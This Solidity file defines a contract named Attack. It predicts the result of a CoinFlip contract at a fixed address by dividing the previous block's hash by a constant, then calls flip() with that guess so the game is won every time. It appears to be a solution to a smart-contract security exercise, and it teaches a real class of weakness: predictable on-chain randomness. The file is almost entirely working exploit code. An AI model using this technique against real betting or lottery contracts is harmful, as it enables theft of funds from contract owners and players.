// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    CoinFlip flip = CoinFlip(0x9F825B37DD23c96271778Ff39D54053E0B37Aa25);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        flip.flip(side);
    }
}